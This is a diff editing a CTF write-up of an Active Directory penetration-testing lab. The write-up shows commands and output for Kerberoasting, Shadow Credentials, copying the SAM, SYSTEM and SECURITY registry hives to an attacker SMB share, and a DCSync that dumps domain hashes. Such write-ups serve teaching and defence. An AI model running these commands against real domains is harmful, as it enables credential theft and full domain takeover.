@@ -7,8 +7,8 @@ authors:
     twitter: "https://x.com/gatariee"
     github: "https://github.com/gatariee"
   - name: "Saif 'Sawyer' Yaseen"
-    title: "PT Intern"
     avatar: "./assets/img/authors/sawyer.png"
+    title: "External Contributor"
     github: "https://github.com/sawyerspresent"
 ---
 
@@ -46,7 +46,7 @@ This is a writeup of the PT Village that we organized during the [BSidesAmman Co
 <li>
 <a href="#authentication-as-abdullah">Authentication as Abdullah.Azooz</a>
 <ul>
-<li><a href="#bloodyad-enumeration">ACL Enumeration</a></li>
+<li><a href="#acl-enumeration-through-bloodyad">ACL Enumeration through BloodyAD</a></li>
 </ul>
 </li>
 
@@ -60,9 +60,9 @@ This is a writeup of the PT Village that we organized during the [BSidesAmman Co
 </li>
 
 <li>
-<a href="#retrieving-domain-admin-hashes-through-dcsync">DCSync</a>
+<a href="#dcsync">DCSync</a>
 <ul>
-<li><a href="#transfering-the-files-over">Transferring the files</a></li>
+<li><a href="#transferring-the-files-over">Transferring the files over</a></li>
 <li><a href="#dcsync-through-machine-account">DCSync using the machine account</a></li>
 </ul>
 </li>
@@ -70,7 +70,6 @@ This is a writeup of the PT Village that we organized during the [BSidesAmman Co
 
 </div>
 </div>
-<br>
 
 
 ## Introduction
@@ -81,8 +80,8 @@ The CTF ran across 2 days, where the scenario was slightly modified from the ori
 
 #### Day 1 - Assumed Breach
 
-The following credentials were given as part of an assumed breach for the internal assessment: 
-  
+The following credentials were provided as part of an assumed breach for internal assessment: 
+
 ```  
 hasan.bakri@albalad.bsides.rv  
 ILoveJordan123@  
@@ -110,13 +109,12 @@ The following tools will most likely be used during the CTF:
 
 ### BloodHound Usage
 
-> Like previous writeups There is _nothing_ wrong with Bloodhound, But it is always best to understand the limitations of tooling and how to operate without it
-Like previous writeups There is _nothing_ wrong with Bloodhound, But it is always best to understand the limitations of tooling
+> Like previous writeups there is _nothing_ wrong with Bloodhound, But it is always best to understand the limitations of tooling and how to operate without it
 
-<br>
+ 
 
 ## Initial Access
-using the information provided, we can first fingerprint the domain.  
+Using the information provided, we can first fingerprint the domain.  
   
 ```
 echo '10.2.10.11' >> targets.txt
@@ -138,13 +136,13 @@ cat hosts.txt
 10.2.10.11     DC01.albalad.bsides.rv albalad.bsides.rv DC0110.2.10.12     DEV03.albalad.bsides.rv DEV03
 ```  
 
-we can infer that the domain controller is `DC01.albalad.bsides.rv`, however we can confirm this by checking if the `ldap` service is enabled.  
+We can infer that the domain controller is `DC01.albalad.bsides.rv`, however we can confirm this by checking if the `LDAP` service is enabled.  
   
 ```
 nxc ldap DC01.albalad.bsides.rv LDAP        10.2.10.11      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:albalad.bsides.rv)  
 ```  
 
-checking the shares on these machines, we identify a `svc_home$`.  
+Checking the shares on these machines, we identify the `svc_home$`share.  
   
 ```
 nxc smb targets.txt -u 'hasan.bakri' -p 'hasan.bakri' --shares
@@ -169,17 +167,17 @@ SMB         10.2.10.11      445    DC01             NETLOGON        READ        
 SMB         10.2.10.11      445    DC01             SYSVOL          READ            Logon server share
 ```  
   
-we can infer that the `svc_home$` share would belongs to service accounts.  
+We can infer that the `svc_home$` share likely belongs to service accounts.  
 
-<br>
+ 
 
 ## Accessing SVC_WEB
 
-next, we can identify users with a service principal name (SPN) using the following command. users with an SPN can have their service tickets requested, and cracked offline (known as a `kerberoasting` attack.)  
+Next, we can identify users with a service principal name (SPN) using the following command. users with an SPN can have their service tickets requested, and cracked offline known as a `kerberoasting` attack  
   
 ```
 GetUserSPNs.py 'albalad.bsides.rv'/'hasan.bakri':'hasan.bakri'
-Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies   
+Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and  it's affiliated companies   
 ServicePrincipalName                   Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation -------------------------------------  -------  -------------------------------------------------------  --------------------------  ---------  ----------
 HTTP/W-SVR-02.albalad.bsides.rv:80     svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>               
 HTTP/W-SVR-01.albalad.bsides.rv:80     svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>               
@@ -193,7 +191,7 @@ We see that it is slightly odd that none of the service accounts have logged on,
   
 ```  
 GetUserSPNs.py 'albalad.bsides.rv'/'hasan.bakri':'hasan.bakri' -request-user 'svc_web' -outputfile 'svc_web.tgs'
-Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies   
+Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and  it's affiliated companies   
 ServicePrincipalName                Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation ----------------------------------  -------  -------------------------------------------------------  --------------------------  ---------  ----------
 HTTP/W-SVR-02.albalad.bsides.rv:80  svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>               
 HTTP/W-SVR-01.albalad.bsides.rv:80  svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>  
@@ -237,7 +235,7 @@ define('DB_NAME', 'web_db');
 ?>  
 ```  
 
-<br>
+ 
 
 
 
@@ -250,7 +248,7 @@ SMB         10.2.10.11      445    DC01             [*] Windows Server 2022 Buil
 SMB         10.2.10.11      445    DC01             [+] albalad.bsides.rv\abdullah.azooz:PetraEnjoyer1950
 ```  
   
-### ACL Enumeration
+### ACL Enumeration through BloodyAD
 Then we can see that this user has an outbound access control list (ACL) over the `mustafa.yaseen` user.
   
 ```  
@@ -260,17 +258,17 @@ distinguishedName: CN=mustafa.yaseen,CN=Users,DC=albalad,DC=bsides,DC=rvpermissi
 distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=albalad,DC=bsides,DC=rvpermission: WRITE
 ```  
 
-<br>
+ 
 
 ## Privilege Escalation
-So we there are multiple attacks vectors since we have genericwrite on a user. them being;   
+So there are multiple attacks vectors since we have genericwrite on a user. which are;   
   
 - Targeted Kerberoasting  
 - ShadowCredentials  
   
 
 ### Targeted Kerberoasting
-The first option here would be to use targeted kerberoasting. this abuse can be carried out if we have one of the following ACLs over a target, `GenericWrite`, `WriteProperty`. we can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This technique is called Targeted Kerberoasting.  
+The first option here would be to use targeted kerberoasting. this abuse can be carried out if we have one of the following ACL's over a target such as `GenericWrite` or `WriteProperty`. we can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This technique is called Targeted Kerberoasting.  
   
 
 ```  
@@ -279,7 +277,7 @@ targetedKerberoast.py -d albalad.bsides.rv -u abdullah.azooz  -p 'PetraEnjoyer19
 [+] Writing hash to file for (mustafa.yaseen)  
 ```  
   
-Now we have accomplished the attack lets look at the hash
+Now we have accomplished the attack let's look at the hash
   
 ```  
 cat mustafa.txt  
@@ -303,13 +301,13 @@ Session completed.
 
 ### Shadow Credentials Attack
 
-Its not out of the norm for targetedkerberoasting not work too, since some users might have very strong & complex passwords. Hence we will move towards shadow credentials incase the password doesn't crack  
+ it's not out of the norm for targeted kerberoasting not work too, since some users might have very strong and complex passwords. Hence we will move towards shadow credentials  in case the password doesn't crack  
   
-Active Directory user and computer objects include an `msDS-KeyCredentialLink` attribute where public keys can be stored, when enabling PKINIT pre-authentication the KDC validates that a user possesses the corresponding private key before issuing a TGT. If an attacker gains permissions to modify another object’s `msDS-KeyCredentialLink`—for example, via group membership or elevated ACEs—they can inject their own public key and thereafter authenticate as that account, granting them persistent, stealthy access to the target.  
-  
+Active Directory user and computer objects contain a `msDS-KeyCredentialLink` attribute where public keys can be stored. This becomes relevant when PKINIT pre-authentication is enabled, because the Key Distribution Center (KDC) checks that a user actually has the private key that matches the stored public key before issuing a Ticket Granting Ticket (TGT) from which we extract the NT Hash. Since we have write permissions to modify Mustafa's `msDS-KeyCredentialLink` we can inject our own public key and thereafter authenticate as him, granting us persistent access. 
+
 ```  
 kali@kali ~> certipy shadow auto -u abdullah.azooz@albalad.bsides.rv -p 'PetraEnjoyer1950' -account mustafa.yaseenCertipy v4.8.2 - by Oliver Lyak (ly4k)  
-  
+
 [*] Targeting user 'mustafa.yaseen'  
 [*] Generating certificate  
 [*] Certificate generated  
@@ -330,7 +328,7 @@ kali@kali ~> certipy shadow auto -u abdullah.azooz@albalad.bsides.rv -p 'PetraEn
 
 ### Group Enumeration
 
-Using this hash we can authenticate as this user and we could see that this user is a member of backup operators.  
+Using this hash we can authenticate as this user and we could see that this user is a member of Backup Operators.  
 
 ```  
 bloodyAD --host 10.2.10.11 -d albalad.bsides.rv -u 'mustafa.yaseen'  -p ':409a45a42c916885ac56127bebf06225' get membership mustafa.yaseen  
@@ -338,15 +336,19 @@ distinguishedName: CN=Users,CN=Builtin,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-
 distinguishedName: CN=Backup Operators,CN=Builtin,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-5-32-551sAMAccountName: Backup Operators  
 distinguishedName: CN=Domain Users,CN=Users,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-5-21-3705552387-1610714051-5520856-513sAMAccountName: Domain Users
 ```  
-<br>
 
 
-## Retrieving Domain Admin hashes through DCSync
-### Transfering the files over
-To minimize our footprint we are going to dump the SAM, SYSTEM & SECURITY on our attack box by first setting up an SMB Server
+## DCSync
+
+Discovering abdullah.azooz is a part of Backup Operators this means he has permissions to perform backup and restore operations. More specifically, they will have the SeBackupPrivilege assigned which enables them to read and retrieve sensitive files from the domain controller such as the SAM, SYSTEM and SECURITY.
+
+
+
+### Transferring the files over
+To minimize our footprint we are going to dump the SAM, SYSTEM and SECURITY on our attack box by first setting up an SMB Server
 
 ```  
-smbserver.py sawyer . -smb2supportImpacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
+smbserver.py sawyer . -smb2supportImpacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and  it's affiliated companies   
 [*] Config file parsed  
 [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0  
@@ -365,20 +367,20 @@ smbserver.py sawyer . -smb2supportImpacket v0.13.0.dev0+20250307.160229.6e0a969 
 then dumping it to that remote location
   
 ```  
-reg.py albalad.bsides.rv/mustafa.yaseen:whybackup88@10.2.10.11 backup -o '\\\\198.51.100.2\\sawyer\\'Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
+reg.py albalad.bsides.rv/mustafa.yaseen:whybackup88@10.2.10.11 backup -o '\\\\198.51.100.2\\sawyer\\'Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and  it's affiliated companies   
 [!] Cannot check RemoteRegistry status. Triggering start trough named pipe...  
 [*] Saved HKLM\SAM to \\198.51.100.2\sawyer\\SAM.save  
 [*] Saved HKLM\SYSTEM to \\198.51.100.2\sawyer\\SYSTEM.save  
 [*] Saved HKLM\SECURITY to \\198.51.100.2\sawyer\\SECURITY.save  
 ```  
   
-So now we can dump everything locally!, Lets first start by dumping the SAM
+So now we can dump everything locally!, let's first start by dumping the SAM
   
 ```  
 secretsdump.py -sam 'SAM.save' -system 'SYSTEM.save' LOCAL  
   
   
-Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
+Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and  it's affiliated companies   
 [*] Target system bootKey: 0x6f5fdaf97f208b1c48ab1cf9d83438e6  
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:f993698383cc8dc572e8abae5f71c7a1:::  
@@ -387,13 +389,13 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 [*] Cleaning up...   
 ``` 
 
-Despite our efforts, the Domain Administrator hashes could not be obtained from here. The next step will be attempting to dump the SYSTEM registry hive  
+Despite our efforts, the Domain Administrator hashes could not be obtained from here. Next, we will attempt to dump the SYSTEM registry hive  
 
 ``` 
 secretsdump.py -system SYSTEM.save -security SECURITY.save LOCAL  
   
   
-Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
+Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and  it's affiliated companies   
 [*] Target system bootKey: 0x6f5fdaf97f208b1c48ab1cf9d83438e6  
 [*] Dumping cached domain logon information (domain/username:hash)  
 [*] Dumping LSA Secrets  
@@ -409,11 +411,11 @@ dpapi_userkey:0xa3cf76ada7b5a47872bc8c3b2fe8c660f9254c89
 ```  
   
 ### DCSync through machine account
-Through Dumping the SYSTEM we can use the DC account to perform DCSync!
+By dumping the SYSTEM We are able to find the DC account hash, this allows us to perform a [DCSync!](https://adsecurity.org/?p=1729)
   
   
 ``` 
-secretsdump.py albalad.bsides.rv/DC01\$@10.2.10.11 -hashes ':7b22f222a57d771b33826a805543acb8'Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
+secretsdump.py albalad.bsides.rv/DC01\$@10.2.10.11 -hashes ':7b22f222a57d771b33826a805543acb8'Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and  it's affiliated companies   
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
 [*] Using the DRSUAPI method to get NTDS.DIT secrets  
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::  
